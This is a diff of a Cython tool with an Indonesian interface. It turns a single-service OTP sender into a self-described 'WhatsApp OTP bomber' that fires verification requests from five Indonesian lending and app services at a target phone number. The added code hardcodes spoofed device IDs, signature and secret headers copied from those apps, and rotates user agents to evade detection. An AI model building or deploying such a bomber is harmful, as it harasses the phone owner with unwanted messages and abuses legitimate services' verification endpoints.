@@ -421,64 +421,200 @@ cpdef tuple valid_phone(str phone):
     
     return (True, cleaned, "")
 
-cpdef str get_random_ua():
+used_user_agents = set()
+
+cpdef str get_unique_ua():
+    cdef int max_attempts = 50
+    cdef int attempt = 0
+    cdef str new_ua
+    global used_user_agents
+    
     try:
         ua = UserAgent()
-        return ua.random
+        while attempt < max_attempts:
+            new_ua = ua.random
+            if new_ua not in used_user_agents:
+                used_user_agents.add(new_ua)
+                return new_ua
+            attempt += 1
+        used_user_agents.clear()
+        new_ua = ua.random
+        used_user_agents.add(new_ua)
+        return new_ua
     except:
         return "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36"
 
-cpdef tuple send_sms_dexatel(str phone, dict cfg):
-    cdef str bearer_token = cfg.get("dexatel_bearer_token", "")
-    cdef str ua = get_random_ua()
-    cdef str url = "https://api.dexatel.com/v1/phone_verifications"
-    cdef str phone_with_code = "62" + phone
+cpdef tuple send_pinjam_duit(str phone):
+    cdef str ua = get_unique_ua()
+    cdef str url = "https://api-prod.pinjamduit.co.id/gw/loan/credit-user/sms-code"
+    cdef str phone_with_0 = "0" + phone
+    cdef str timestamp = str(int(time.time() * 1000))
     
-    if not bearer_token:
-        return (False, "Dexatel tidak dikonfigurasi")
+    cdef str payload = f"phone={phone_with_0}&sms_useage=10&sms_service=2&mobilePhone=&clientType=a&appVersion=7.1.0&deviceId=039B037C963389AA5F61ED11335A20FE&hardwareid=683a1c3eacbe95cbea77e33cb28cd37aa8a235a521ecd19d9641855ff83a4741&deviceName=V2205&osVersion=14&appName=PinjamDuit&appMarket=google_play"
+    
+    cdef dict headers = {
+        'User-Agent': ua,
+        'Accept-Encoding': "gzip",
+        'ss': "PvCzXQxBx2dgPGH1UHPONt7eXWgubCk1E6ujEEzOxlCAD5X2gYLKa74O+ay3nMID",
+        'ts': "dXRjG+7WKZ5HVxA2LZihTw==",
+        'timestamp': timestamp,
+        'Content-Type': "application/x-www-form-urlencoded"
+    }
+    try:
+        r = requests.post(url, data=payload, headers=headers, timeout=30)
+        if r.status_code == 200:
+            return (True, "Pinjam Duit")
+        return (False, f"Pinjam Duit: {r.status_code}")
+    except Exception as e:
+        return (False, f"Pinjam Duit: {str(e)[:30]}")
+
+cpdef tuple send_primenotif(str phone):
+    cdef str ua = get_unique_ua()
+    cdef str url = "https://api-prod.pinjamduit.co.id/gw/loan/credit-user/sms-code"
+    cdef str phone_with_0 = "0" + phone
+    cdef str timestamp = str(int(time.time() * 1000))
+    
+    cdef str payload = f"phone={phone_with_0}&sms_useage=11&sms_service=1&mobilePhone=&clientType=a&appVersion=7.1.0&deviceId=039B037C963389AA5F61ED11335A20FE&hardwareid=683a1c3eacbe95cbea77e33cb28cd37aa8a235a521ecd19d9641855ff83a4741&deviceName=V2205&osVersion=14&appName=PinjamDuit&appMarket=google_play"
+    
+    cdef dict headers = {
+        'User-Agent': ua,
+        'Accept-Encoding': "gzip",
+        'ss': "XwaNQaSd2dOljZwp//oRwlxoJzP+zbQD9qKh0t2w2a5X5rCEQlwI5FBh15ODZOqf",
+        'ts': "c10XbhtingUOsyzkhNJfQg==",
+        'timestamp': timestamp,
+        'Content-Type': "application/x-www-form-urlencoded"
+    }
+    try:
+        r = requests.post(url, data=payload, headers=headers, timeout=30)
+        if r.status_code == 200:
+            return (True, "Primenotif")
+        return (False, f"Primenotif: {r.status_code}")
+    except Exception as e:
+        return (False, f"Primenotif: {str(e)[:30]}")
+
+cpdef tuple send_titipku(str phone):
+    cdef str ua = get_unique_ua()
+    cdef str url = "https://titipku.tech/v1/mobile/auth/otp?method=wa"
+    cdef str phone_with_code = "+62" + phone
     
     cdef dict payload = {
-        "data": {
-            "phone": phone_with_code
-        }
+        "phone_number": phone_with_code,
+        "message_placeholder": "Titipku: @PIN@. Berlaku selama 5 menit. Jangan berikan info ini kepada siapapun."
     }
+    
+    cdef dict headers = {
+        'User-Agent': ua,
+        'Connection': "Keep-Alive",
+        'Accept-Encoding': "gzip",
+        'Content-Type': "application/json",
+        'Authorization': "",
+        'device-id': "cd7dbc08842ce277",
+        'App-Type': "nitiper"
+    }
+    try:
+        r = requests.post(url, json=payload, headers=headers, timeout=30)
+        if r.status_code == 200:
+            return (True, "Titipku")
+        return (False, f"Titipku: {r.status_code}")
+    except Exception as e:
+        return (False, f"Titipku: {str(e)[:30]}")
+
+cpdef tuple send_fazpass(str phone):
+    cdef str ua = get_unique_ua()
+    cdef str phone_with_0 = "0" + phone
+    cdef str timestamp = datetime.now().strftime("%Y-%m-%dT%H:%M:%S+0700")
+    cdef str url = f"https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=02cd7dbc08842ce277&version_name=6.14.07&version=61407"
+    
+    cdef str payload = f"phone_number={phone_with_0}"
+    
+    cdef dict headers = {
+        'User-Agent': ua,
+        'Accept': "application/json",
+        'Accept-Encoding': "gzip",
+        'authorization': "Bearer null",
+        'x-signature': "84ffe05edd4fd46210d0085b6993840eb4358fd358744bc16676ee987cc0a33d",
+        'x-timestamp': timestamp,
+        'x-secret': "eff518bf1ce3ce25fae4424f8ed2bd0177244f32bdbc192fca5d0891f298180b",
+        'cache-control': "max-age=432000",
+        'Content-Type': "application/x-www-form-urlencoded"
+    }
+    try:
+        r = requests.post(url, data=payload, headers=headers, timeout=30)
+        if r.status_code == 200:
+            return (True, "Fazpass")
+        return (False, f"Fazpass: {r.status_code}")
+    except Exception as e:
+        return (False, f"Fazpass: {str(e)[:30]}")
+
+cpdef tuple send_pinjam_min(str phone):
+    cdef str ua = get_unique_ua()
+    cdef str url = "https://api.pinjamin.com/ina/util/verify-code"
+    
+    cdef dict payload = {
+        "sign": "4fceed9522eb49553a223d76f88b436d",
+        "phone": phone,
+        "type": 1
+    }
+    
     cdef dict headers = {
         'User-Agent': ua,
         'Accept': "application/json, text/plain, */*",
         'Accept-Encoding': "gzip, deflate, br, zstd",
         'Content-Type': "application/json",
         'sec-ch-ua-platform': '"Android"',
-        'authorization': f"Bearer {bearer_token}",
+        'X-VERSION': "2.2.4",
         'sec-ch-ua': '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
+        'X-TOKEN': "",
         'sec-ch-ua-mobile': "?1",
-        'origin': "https://dashboard.dexatel.com",
-        'x-requested-with': "mark.via.gp",
-        'sec-fetch-site': "same-site",
-        'sec-fetch-mode': "cors",
-        'sec-fetch-dest': "empty",
-        'referer': "https://dashboard.dexatel.com/",
-        'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-        'priority': "u=1, i"
+        'X-SOURCE': "",
+        'X-applicationId': "com.pinjamwinwin",
+        'X-CHANNEL': "Pinjamwinwin",
+        'Origin': "https://web.pinjamin.com",
+        'X-Requested-With': "com.pinjamwinwin",
+        'Sec-Fetch-Site': "same-site",
+        'Sec-Fetch-Mode': "cors",
+        'Sec-Fetch-Dest': "empty",
+        'Referer': "https://web.pinjamin.com/",
+        'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
     }
     try:
-        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
-        if r.status_code in [200, 201]:
-            return (True, f"Dexatel SMS: OTP terkirim!")
-        return (False, f"Dexatel Error: {r.text[:100]}")
+        r = requests.post(url, json=payload, headers=headers, timeout=30)
+        if r.status_code == 200:
+            return (True, "Pinjam Min")
+        return (False, f"Pinjam Min: {r.status_code}")
     except Exception as e:
-        return (False, f"Dexatel Error: {str(e)}")
+        return (False, f"Pinjam Min: {str(e)[:30]}")
+
+WA_SERVICES = [
+    ("Pinjam Duit", send_pinjam_duit),
+    ("Primenotif", send_primenotif),
+    ("Titipku", send_titipku),
+    ("Fazpass", send_fazpass),
+    ("Pinjam Min", send_pinjam_min),
+]
 
 cpdef void do_sms_config_with_cfg(dict cfg):
-    cdef str phone_input, phone_clean, msg, count_input
+    cdef str phone_input, phone_clean, msg
     cdef bint valid, ok
-    cdef int i, sel, send_count, success_count, fail_count
+    cdef int i, sel, success_count, fail_count, total_services
+    cdef list results
+    global used_user_agents
+    
+    used_user_agents.clear()
     
     clear()
     print()
-    section("KIRIM OTP VIA DEXATEL")
     
-    print(f" {YL}[!]{R} Format nomor: 8xxxxxxxxx (tanpa +62/0)")
-    print(f" {YL}[!]{R} Contoh: 895325844493")
+    console.print(Panel(
+        f"[bold cyan]WHATSAPP OTP BOMBER[/bold cyan]\n"
+        f"[dim]Type: WhatsApp | Max: 1x per layanan[/dim]",
+        border_style="cyan",
+        padding=(1, 2)
+    ))
+    
+    print()
+    console.print(f" [bold yellow][!][/bold yellow] Format: 8xxxxxxxxx (tanpa +62/0)")
+    console.print(f" [bold yellow][!][/bold yellow] Contoh: 895325844493")
     print()
     
     phone_input = input(f" {GR}[?]{R} Nomor Target : {CY}").strip()
@@ -487,46 +623,34 @@ cpdef void do_sms_config_with_cfg(dict cfg):
     valid, phone_clean, msg = valid_phone(phone_input)
     if not valid:
         error(msg)
+        input(f"\n {D}Tekan Enter...{R}")
         return
     
-    success(f"Nomor valid: +62{phone_clean}")
+    total_services = len(WA_SERVICES)
+    
+    print()
+    console.print(Panel(
+        f"[bold green]TARGET[/bold green]: +62{phone_clean}\n"
+        f"[bold cyan]LAYANAN[/bold cyan]: {total_services} WhatsApp Services\n"
+        f"[bold yellow]MODE[/bold yellow]: 1x request per layanan",
+        border_style="green",
+        padding=(0, 2)
+    ))
     print()
     
-    print(f" {YL}[!]{R} Berapa kali kirim? (Max 10)")
-    count_input = input(f" {GR}[?]{R} Jumlah Kirim : {CY}").strip()
-    print(R, end="")
-    
-    try:
-        send_count = int(count_input)
-        if send_count < 1:
-            send_count = 1
-        elif send_count > 10:
-            send_count = 10
-            info("Jumlah diatur ke maksimal 10")
-    except:
-        send_count = 1
-        info("Input tidak valid, diatur ke 1")
-    
-    success(f"Akan mengirim {send_count}x ke +62{phone_clean}")
+    console.print(" [bold white]DAFTAR LAYANAN:[/bold white]")
+    for idx, (name, _) in enumerate(WA_SERVICES, 1):
+        console.print(f"   [cyan]{idx}.[/cyan] {name}")
     print()
-    
-    title_box = (
-        f"\n{CY}{B}"
-        f"╭───────────────────────────────╮\n"
-        f"│      KIRIM OTP DEXATEL        │\n"
-        f"│      Total: {send_count}x kirim            │\n"
-        f"╰───────────────────────────────╯"
-        f"{R}"
-    )
     
     options = [
-        f"{B}Kirim OTP   - Kirim {send_count}x via Dexatel{R}",
+        f"{B}Mulai Kirim - Kirim ke semua layanan{R}",
         f"{B}← Batal{R}",
     ]
     
     menu = TerminalMenu(
         menu_entries=options,
-        title=title_box,
+        title=f"\n{GR}Pilih Aksi:{R}",
         menu_cursor="▶ ",
         menu_cursor_style=("fg_red",),
         menu_highlight_style=("fg_yellow", "bold"),
@@ -540,63 +664,100 @@ cpdef void do_sms_config_with_cfg(dict cfg):
     
     clear()
     print()
-    section("MENGIRIM OTP")
-    info(f"Target: +62{phone_clean}")
-    info(f"Jumlah: {send_count}x kirim")
-    info("Layanan: Dexatel SMS")
-    info("Tekan CTRL+C untuk stop")
+    
+    console.print(Panel(
+        f"[bold white]MENGIRIM OTP VIA WHATSAPP[/bold white]\n"
+        f"[dim]Target: +62{phone_clean} | Tekan CTRL+C untuk stop[/dim]",
+        border_style="magenta",
+        padding=(0, 2)
+    ))
     print()
     
     success_count = 0
     fail_count = 0
+    results = []
+    
+    table = Table(show_header=True, header_style="bold cyan", box=None)
+    table.add_column("No", style="dim", width=4)
+    table.add_column("Layanan", width=15)
+    table.add_column("Status", width=12)
+    table.add_column("Keterangan", width=20)
     
     try:
-        for i in range(send_count):
-            print(f"\n {CY}[{i+1}/{send_count}]{R} Mengirim...")
+        for i, (name, func) in enumerate(WA_SERVICES):
+            print(f" {CY}[{i+1}/{total_services}]{R} Mengirim via {name}...")
             
-            if i == 0:
-                info("Delay pertama: 10 detik...")
-                for sec in range(10, 0, -1):
-                    print(f"\r {YL}[!]{R} Menunggu {sec} detik...  ", end="", flush=True)
-                    time.sleep(1)
-                print()
-            else:
-                info("Delay: 60 detik...")
-                for sec in range(60, 0, -1):
-                    print(f"\r {YL}[!]{R} Menunggu {sec} detik...  ", end="", flush=True)
-                    time.sleep(1)
-                print()
-            
-            loading_tqdm(f"Mengirim ke-{i+1}", 20)
-            
-            ok, msg = send_sms_dexatel(phone_clean, cfg)
+            ok, result_msg = func(phone_clean)
             
             if ok:
-                success(msg)
                 success_count += 1
+                results.append((str(i+1), name, "[green]OK[/green]", "Terkirim"))
+                success(f"{name}: Terkirim!")
             else:
-                error(msg)
                 fail_count += 1
+                results.append((str(i+1), name, "[red]GAGAL[/red]", result_msg[:20]))
+                error(f"{result_msg}")
+            
+            if i < total_services - 1:
+                time.sleep(1)
         
         print()
-        section("HASIL PENGIRIMAN")
-        success(f"Berhasil: {success_count}x")
-        if fail_count > 0:
-            error(f"Gagal: {fail_count}x")
-        info(f"Total: {send_count}x")
+        console.print(Panel(
+            f"[bold white]HASIL PENGIRIMAN[/bold white]",
+            border_style="cyan",
+            padding=(0, 2)
+        ))
+        print()
+        
+        result_table = Table(show_header=True, header_style="bold cyan", box=None)
+        result_table.add_column("No", style="dim", width=4)
+        result_table.add_column("Layanan", width=15)
+        result_table.add_column("Status", width=12)
+        result_table.add_column("Keterangan", width=25)
+        
+        for row in results:
+            result_table.add_row(*row)
+        
+        console.print(result_table)
+        
+        print()
+        console.print(Panel(
+            f"[bold green]Berhasil[/bold green]: {success_count}/{total_services}\n"
+            f"[bold red]Gagal[/bold red]: {fail_count}/{total_services}",
+            border_style="green" if success_count > fail_count else "red",
+            padding=(0, 2)
+        ))
         
     except KeyboardInterrupt:
         print()
         print()
         info("Proses dihentikan oleh user (CTRL+C)")
         print()
-        section("HASIL PENGIRIMAN (TERHENTI)")
-        success(f"Berhasil: {success_count}x")
-        if fail_count > 0:
-            error(f"Gagal: {fail_count}x")
-        info(f"Terkirim: {success_count + fail_count}/{send_count}")
+        
+        if results:
+            result_table = Table(show_header=True, header_style="bold cyan", box=None)
+            result_table.add_column("No", style="dim", width=4)
+            result_table.add_column("Layanan", width=15)
+            result_table.add_column("Status", width=12)
+            result_table.add_column("Keterangan", width=25)
+            
+            for row in results:
+                result_table.add_row(*row)
+            
+            console.print(result_table)
+        
+        print()
+        console.print(Panel(
+            f"[bold yellow]TERHENTI[/bold yellow]\n"
+            f"[bold green]Berhasil[/bold green]: {success_count}\n"
+            f"[bold red]Gagal[/bold red]: {fail_count}\n"
+            f"[dim]Terkirim: {success_count + fail_count}/{total_services}[/dim]",
+            border_style="yellow",
+            padding=(0, 2)
+        ))
     
     print()
+    input(f" {D}Tekan Enter untuk kembali...{R}")
 
 
 cdef class Auth:
